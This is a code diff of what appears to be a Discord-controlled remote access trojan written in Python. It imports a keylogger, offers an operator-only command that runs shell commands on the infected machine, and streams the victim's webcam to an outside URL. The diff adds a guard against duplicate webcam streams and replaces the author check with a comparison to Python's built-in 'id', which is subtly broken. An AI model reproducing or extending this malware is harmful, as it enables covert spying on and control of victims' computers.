@@ -10,7 +10,7 @@ from Key_logging import Keylogger
 from urllib.parse import urlparse
 from discord.ext import commands
 
-TOKEN = 'TOKEN'
+TOKEN = ''
 BANNED_EXTENSIONS = {'.html', '.htm', '.exe', '.scr', '.cpl', '.doc', '.docx', '.jar'}
 
 intent = discord.Intents.all()
@@ -200,7 +200,7 @@ async def exe(ctx: commands.Context,*, cmd: str = None):
     if not cmd:
         return await ctx.send("enter a command you want to run")
     try:
-        if ctx.author.id != 1434492547409117264:
+        if ctx.author.id != id:
             await ctx.send("cannot run command, only author")
             return
 
@@ -768,6 +768,9 @@ async def on_message(message):
             if not url.startswith(("https://", "http://")):
                 await ctx.send("wrong formatting, should be `.streamcam <url>`")
                 return
+            if ctx.channel.id in activeCam:
+                await ctx.send("webcam streaming is already running! type `.stopcam` to stop")
+                return
             furl = f"{url.rstrip('/')}/upload"
             await ctx.send(f"starting webcam streaming at url '{url}'")
             task = asyncio.create_task(streamcam(ctx=ctx, url=furl))
@@ -855,5 +858,5 @@ async def on_message(message):
         else:
             await ctx.send(f"unknown command `{command}`, type `.help` for help")
             return
-
+        
 bot.run(TOKEN, reconnect=True)
